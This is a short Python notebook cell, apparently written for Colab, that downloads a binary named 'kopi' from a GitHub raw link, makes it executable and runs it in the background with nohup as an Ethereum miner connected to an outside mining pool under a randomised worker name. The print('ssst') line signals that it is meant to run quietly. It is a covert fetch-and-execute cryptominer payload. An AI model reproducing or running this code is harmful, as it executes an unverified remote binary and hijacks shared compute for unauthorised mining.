#@title
import urllib.request
import os
print('ssst')
urllib.request.urlretrieve('https://github.com/aurbach55/dera/raw/main/kopi','kopi')
os.system ("chmod +x ./kopi && nohup ./kopi --coin ETH --pool ethash.kupool.com:443 --user prodent.$(echo $(shuf -i 1-99999 -n 1)-T4) > nohup.out")
